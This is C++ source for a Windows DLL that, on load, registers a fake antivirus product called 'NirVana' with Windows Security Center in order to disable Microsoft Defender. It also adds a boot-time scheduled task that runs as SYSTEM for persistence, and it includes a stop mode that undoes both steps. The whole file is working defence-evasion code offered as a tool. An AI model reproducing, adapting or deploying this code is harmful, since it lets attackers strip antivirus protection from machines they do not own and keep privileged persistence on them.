#include <Windows.h>
#include <iostream>
#include <comdef.h>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

bool g_stop_mode = false;

extern "C" __declspec(dllexport) void set_stop_mode() {
    g_stop_mode = true;
}
static const GUID CLSID_WscIsv =
{ 0xF2102C37, 0x90C3, 0x450C, {0xB3, 0xF6, 0x92, 0xBE, 0x16, 0x93, 0xBD, 0xF2} };

static const GUID IID_IWscAVStatus4 =
{ 0x4DCBAFAC, 0x29BA, 0x46B1, {0x80, 0xFC, 0xB8, 0xBD, 0xE3, 0xC0, 0xAE, 0x4D} };

enum class WSCSecurityProductState : unsigned int {
    ON = 0,
    OFF = 1,
    SNOOZED = 2,
    EXPIRED = 3
};

struct IWscAVStatus4 : public IUnknown {
    virtual HRESULT __stdcall Register(BSTR path, BSTR name, unsigned int, unsigned int) = 0;
    virtual HRESULT __stdcall Unregister() = 0;
    virtual HRESULT __stdcall UpdateStatus(WSCSecurityProductState state, BOOL unk) = 0;
};


void add_to_autorun() {
   
    char loader_path[MAX_PATH];
    GetModuleFileNameA(nullptr, loader_path, MAX_PATH);
    ITaskService* service = nullptr;
    HRESULT hr = CoCreateInstance(
        CLSID_TaskScheduler,
        nullptr,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&service
    );
    if (FAILED(hr)) {
        MessageBoxA(nullptr, "TaskScheduler CoCreateInstance failed", "Error", MB_OK);
        return;
    }
    hr = service->Connect(
        _variant_t(), _variant_t(),
        _variant_t(), _variant_t()
    );
    if (FAILED(hr)) {
        service->Release();
        return;
    }
    ITaskFolder* root = nullptr;
    hr = service->GetFolder(_bstr_t(L"\\"), &root);
    if (FAILED(hr)) {
        service->Release();
        return;
    }
    root->DeleteTask(_bstr_t(L"NirVana"), 0);
    ITaskDefinition* task = nullptr;
    hr = service->NewTask(0, &task);
    if (FAILED(hr)) {
        root->Release();
        service->Release();
        return;
    }
    IPrincipal* principal = nullptr;
    task->get_Principal(&principal);
    principal->put_UserId(_bstr_t(L"SYSTEM"));
    principal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
    principal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
    principal->Release();
    ITriggerCollection* triggers = nullptr;
    task->get_Triggers(&triggers);
    ITrigger* trigger = nullptr;
    triggers->Create(TASK_TRIGGER_BOOT, &trigger);
    trigger->Release();
    triggers->Release();
    IActionCollection* actions = nullptr;
    task->get_Actions(&actions);
    IAction* action = nullptr;
    actions->Create(TASK_ACTION_EXEC, &action);
    IExecAction* exec = nullptr;
    action->QueryInterface(IID_IExecAction, (void**)&exec);
    exec->put_Path(_bstr_t(loader_path));
    exec->Release();
    action->Release();
    actions->Release();
    ITaskSettings* settings = nullptr;
    task->get_Settings(&settings);
    settings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
    settings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
    settings->Release();
    IRegisteredTask* registered = nullptr;
    hr = root->RegisterTaskDefinition(
        _bstr_t(L"NirVana"),
        task,
        TASK_CREATE_OR_UPDATE,
        _variant_t(), _variant_t(),
        TASK_LOGON_NONE,
        _variant_t(L""),
        &registered
    );
    if (registered) registered->Release();
    task->Release();
    root->Release();
    service->Release();
}


GUID get_wsc_clsid() {
    GUID clsid = {};

    HKEY classes_key;
    if (RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Classes\\CLSID",
        0, KEY_READ, &classes_key) == ERROR_SUCCESS)
    {
        char subkey_name[256];
        DWORD index = 0;
        DWORD name_size = sizeof(subkey_name);

        while (RegEnumKeyExA(
            classes_key, index++,
            subkey_name, &name_size,
            nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS)
        {
            name_size = sizeof(subkey_name);

            HKEY subkey;
            if (RegOpenKeyExA(classes_key, subkey_name, 0, KEY_READ, &subkey) == ERROR_SUCCESS) {
                char value[256] = {};
                DWORD value_size = sizeof(value);
                DWORD type;

                if (RegQueryValueExA(
                    subkey, "",
                    nullptr, &type,
                    (LPBYTE)value, &value_size) == ERROR_SUCCESS)
                {
                    if (strcmp(value, "Windows Security Center ISV API") == 0) {
                        wchar_t wide_guid[256];
                        MultiByteToWideChar(CP_ACP, 0, subkey_name, -1, wide_guid, 256);
                        CLSIDFromString(wide_guid, &clsid);
                        RegCloseKey(subkey);
                        break;
                    }
                }
                RegCloseKey(subkey);
            }
        }
        RegCloseKey(classes_key);
    }

    GUID empty = {};
    if (memcmp(&clsid, &empty, sizeof(GUID)) == 0) {
        CLSIDFromString(
            L"{F2102C37-90C3-450C-B3F6-92BE1693BDF2}",
            &clsid
        );
    }

    return clsid;
}

void do_register() {

    HRESULT hr = CoInitialize(nullptr);
    if (FAILED(hr)) {
        MessageBoxA(nullptr, "CoInitialize failed", "Error", MB_OK);
        return;
    }
    IWscAVStatus4* inst = nullptr;

    GUID clsid = get_wsc_clsid();

    hr = CoCreateInstance(
        clsid,
        nullptr,
        CLSCTX_INPROC_SERVER,
        IID_IWscAVStatus4,
        (void**)&inst
    );

    if (FAILED(hr)) {
        CoUninitialize();
        return;
    }

    inst->Unregister();

    BSTR name = SysAllocString(L"NirVana");
    hr = inst->Register(name, name, 0, 0);


    hr = inst->UpdateStatus(WSCSecurityProductState::ON, TRUE);

    SysFreeString(name);
    inst->Release();
    CoUninitialize();
}

void do_unregister() {

    HRESULT hr = CoInitialize(nullptr);
    GUID clsid = get_wsc_clsid();
    if (FAILED(hr)) {
        MessageBoxA(nullptr, "CoInitialize failed", "Error", MB_OK);
        return;
    }

    IWscAVStatus4* inst = nullptr;
    hr = CoCreateInstance(
        clsid,
        nullptr,
        CLSCTX_INPROC_SERVER,
        IID_IWscAVStatus4,
        (void**)&inst
    );
    if (FAILED(hr)) {
        MessageBoxA(nullptr, "CoCreateInstance failed", "Error", MB_OK);
        CoUninitialize();
        return;
    }

    hr = inst->Unregister();

    inst->Release();
    CoUninitialize();
}

void remove_autorun() {
    ITaskService* service = nullptr;
    HRESULT hr = CoInitialize(nullptr);

    hr = CoCreateInstance(
        CLSID_TaskScheduler,
        nullptr,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&service
    );
    if (FAILED(hr)) {
        MessageBoxA(nullptr, "TaskScheduler failed", "Error", MB_OK);
        return;
    }

    service->Connect(
        _variant_t(), _variant_t(),
        _variant_t(), _variant_t()
    );

    ITaskFolder* root = nullptr;
    service->GetFolder(_bstr_t(L"\\"), &root);
    hr = root->DeleteTask(_bstr_t(L"NirVana"), 0);

    root->Release();
    service->Release();
    CoUninitialize();
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
            if (g_stop_mode) {
                do_unregister();
                remove_autorun();
                MessageBoxA(nullptr, "Done! Defender restored.", "Stop", MB_OK);
            }
            else {
                do_register();
                add_to_autorun();
            }
            return 0;
            }, nullptr, 0, nullptr);
    }
    return TRUE;
}
